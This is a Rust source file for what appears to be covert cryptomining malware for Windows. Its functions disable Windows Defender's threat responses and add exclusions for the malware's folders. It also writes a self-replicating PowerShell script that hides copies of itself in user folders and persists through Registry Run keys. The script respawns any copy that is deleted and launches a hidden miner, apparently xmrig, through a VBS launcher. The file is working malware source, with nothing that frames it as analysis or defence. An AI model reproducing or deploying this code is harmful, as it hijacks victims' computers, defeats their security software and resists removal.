use std::fs::File;
use std::io::Write;
use std::path::{Path, PathBuf};
use crate::common::constants::{MINER_EXE_NAME, MONITOR_SCRIPT, HELPER_SCRIPT, LAUNCHER_SCRIPT, HELPER_LAUNCHER};

#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
pub fn add_defender_exclusion(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    // Powershell command to add exclusion
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            &format!("Add-MpPreference -ExclusionPath '{}' -Force", path.display())
        ])
        .output();
    Ok(())
}

#[cfg(windows)]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    // Set default actions for all threat levels to 6 (Allow)
    // This allows threats to run without being deleted, while Real-Time protection stays "On".
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            "Set-MpPreference -HighThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -Force"
        ])
        .output();
        
    // Also disable cloud sample submission to avoid uploading our samples
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            "Set-MpPreference -SubmitSamplesConsent 2 -Force"
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn add_defender_exclusion(_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(not(windows))]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}


pub fn create_watchdog_script(install_dirs: &[PathBuf], config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    // P2P GRAPH PERSISTENCE
    // We generate a single powerful script that acts as a Node.
    
    // Initial Seed List for the script (failsafe)
    let dirs_ps: Vec<String> = install_dirs.iter()
        .map(|d| format!("'{}'", d.display()))
        .collect();
    let dirs_array = dirs_ps.join(", ");

    let miner_name = MINER_EXE_NAME;
    let monitor_name = MONITOR_SCRIPT;
    let launcher_name_vbs = LAUNCHER_SCRIPT;

    // The Node Script
    let node_script_content = format!(
        r#"
$ErrorActionPreference = "SilentlyContinue"

# --- CONSTANTS ---
$MY_DIR = $PSScriptRoot
$MINER_EXE = Join-Path $MY_DIR "{miner_name}"
$CONFIG = Join-Path $MY_DIR "sys_config.dat"
$LAUNCHER_VBS = "{launcher_name_vbs}"
$SCRIPT_NAME = $MyInvocation.MyCommand.Name

# Registry Ledger Key
$REG_KEY = "HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek"
$REG_VAL_NODES = "Nodes"

# Polymorphic Resources
$POLY_NAMES = @("SysCache", "WinData", "NetConfig", "CloudSync", "SysDriver", "WinHost", "NetDriver", "SysService")
$POLY_PARENTS = @($env:USERPROFILE, "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Music", "$env:USERPROFILE\\Pictures", "$env:USERPROFILE\\Videos", "$env:APPDATA", "$env:LOCALAPPDATA", "$env:TEMP")

# --- FUNCTIONS ---

function Get-Nodes {{
    # Read the Shared Ledger from Registry
    if (-not (Test-Path $REG_KEY)) {{
        # Fallback to current dir if registry missing
        return @($MY_DIR)
    }}
    $val = Get-ItemProperty -Path $REG_KEY -Name $REG_VAL_NODES -ErrorAction SilentlyContinue
    if ($val) {{
        return $val.$REG_VAL_NODES -split ";" | Where-Object {{ $_ -ne "" }}
    }}
    return @($MY_DIR)
}}

function Update-Nodes ($node_list) {{
    # Write updated list to Registry
    if (-not (Test-Path $REG_KEY)) {{
        New-Item -Path $REG_KEY -Force | Out-Null
    }}
    $str = $node_list -join ";"
    Set-ItemProperty -Path $REG_KEY -Name $REG_VAL_NODES -Value $str
}}

function Spawn-Node {{
    # Create a NEW random node to replace a dead one
    $rnd_name = $POLY_NAMES | Get-Random
    $rnd_parent = $POLY_PARENTS | Get-Random
    $new_dir = Join-Path $rnd_parent $rnd_name
    
    # Avoid collision
    while (Test-Path $new_dir) {{
        $rnd_name = $POLY_NAMES | Get-Random
        $new_dir = Join-Path $rnd_parent $rnd_name
    }}

    # 1. Copy Self
    Copy-Item -Path $MY_DIR -Destination $new_dir -Recurse -Force
    
    # 2. Hide
    $item = Get-Item -Path $new_dir -Force
    $item.Attributes = "Hidden, System, Directory"
    Get-ChildItem -Path $new_dir -Recurse | ForEach-Object {{ $_.Attributes = "Hidden, System" }}

    # 3. Persistence (Registry Run) - Random Key
    $launcher = Join-Path $new_dir $LAUNCHER_VBS
    $reg_run_name = "Win_" + $rnd_name + "_" + (Get-Random)
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $reg_run_name /t REG_SZ /d "wscript.exe `"$launcher`"" /f

    # 4. Launch
    $vbs = Join-Path $new_dir $LAUNCHER_VBS
    wscript.exe "$vbs"

    return $new_dir
}}

function Self-Check {{
    # Ensure I am in the Registry
    $nodes = Get-Nodes
    if ($nodes -notcontains $MY_DIR) {{
        $nodes += $MY_DIR
        Update-Nodes $nodes
    }}
}}

function Perform-Mesh-Check {{
    $nodes = Get-Nodes
    $active_nodes = @()
    $updates_needed = $false

    # verify peers
    foreach ($node in $nodes) {{
        if (Test-Path $node) {{
            $active_nodes += $node
        }} else {{
            # Node DEAD. Spawn NEW Node.
            $new_node = Spawn-Node
            $active_nodes += $new_node
            $updates_needed = $true
        }}
    }}
    
    # Ensure redundancy (Min 2 nodes)
    if ($active_nodes.Count -lt 2) {{
        $new_node = Spawn-Node
        $active_nodes += $new_node
        $updates_needed = $true
    }}

    if ($updates_needed -or ($nodes.Count -ne $active_nodes.Count)) {{
        Update-Nodes $active_nodes
    }}
    
    return $active_nodes
}}

function Leader-Election ($nodes) {{
    # Deterministic Leader Election: First Node Alphabetically
    $sorted = $nodes | Sort-Object
    $leader = $sorted[0]
    
    if ($MY_DIR -eq $leader) {{
        return $true # I AM LEADER
    }}
    return $false # I AM FOLLOWER
}}

function Manage-Mining {{
    $is_leader = Leader-Election (Get-Nodes)
    $miner_proc_name = "{miner_proc}"
    
    if ($is_leader) {{
        # I am Leader: Ensure Miner is RUNNING
        $proc = Get-Process -Name $miner_proc_name -ErrorAction SilentlyContinue
        if (-not $proc) {{
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $MINER_EXE
            $psi.Arguments = "-c `"$CONFIG`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            [System.Diagnostics.Process]::Start($psi) | Out-Null
        }}
    }} else {{
        # I am Follower: DO NOT RUN Miner (avoid duplicate hash power waste / race integrity)
        # Optional: We could let multiple run, but user asked for "Leader" logic.
        # Actually, let's strictly follow "Launcher Launch" logic. 
        # Only Leader launches.
    }}
}}

# --- MAIN LOOP ---
# Initialize Registry if needed
Self-Check

while ($true) {{
    Self-Check
    $nodes = Perform-Mesh-Check
    Manage-Mining
    
    # Jitter to avoid exact sync checks
    $sleep = 10 + (Get-Random -Minimum 0 -Maximum 5)
    Start-Sleep -Seconds $sleep
}}
"#,
        miner_name = miner_name,
        launcher_name_vbs = launcher_name_vbs,
        miner_proc = miner_name.trim_end_matches(".exe")
    );

    // Write Script to ALL initial locations
    let mut vbs_paths = Vec::new();

    for dir in install_dirs {
        if !dir.exists() { continue; }

        let monitor_path = dir.join(MONITOR_SCRIPT);
        let mut f = File::create(&monitor_path)?;
        f.write_all(node_script_content.as_bytes())?;

        // CREATE VBS LAUNCHER
        let vbs_code = format!(
            r#"Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""{}""", 0, False
Set WshShell = Nothing
"#,
            monitor_path.display()
        );
        let vbs_path = dir.join(LAUNCHER_SCRIPT);
        let mut f = File::create(&vbs_path)?;
        f.write_all(vbs_code.as_bytes())?;

        vbs_paths.push(vbs_path);
    }

    Ok(vbs_paths)
}


#[cfg(windows)]
pub fn start_hidden(vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Command::new("wscript.exe")
        .arg(vbs_path)
        .spawn()?;
    
    // Attempt to start the partner launcher if it exists in the same dir
    let dir = vbs_path.parent().unwrap();
    let partner = dir.join(HELPER_LAUNCHER);
    if partner.exists() {
        Command::new("wscript.exe").arg(partner).spawn()?;
    }
    
    Ok(())
}

#[cfg(not(windows))]
pub fn start_hidden(_vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    use crate::constants::MINER_EXE_NAME;
    let miner_proc = MINER_EXE_NAME.trim_end_matches(".exe");
    
    // Kill miner
    let _ = Command::new("taskkill")
        .args(&["/F", "/IM", MINER_EXE_NAME])
        .output();
    
    // Kill powershells running sys_*.ps1
    let _ = Command::new("powershell.exe")
        .args(&["-Command", "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*sys_*.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"])
        .output();
        
    Ok(())
}

#[cfg(not(windows))]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Command;
    let _ = Command::new("pkill").args(&["-f", "xmrig"]).output();
    let _ = Command::new("pkill").args(&["-f", "sys_svchost"]).output();
    Ok(())
}

#[cfg(windows)]
pub fn hide_console() {
    unsafe {
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{ShowWindow, SW_HIDE};
        let window = GetConsoleWindow();
        if !window.is_null() {
            ShowWindow(window, SW_HIDE);
        }
    }
}

#[cfg(not(windows))]
pub fn hide_console() {}
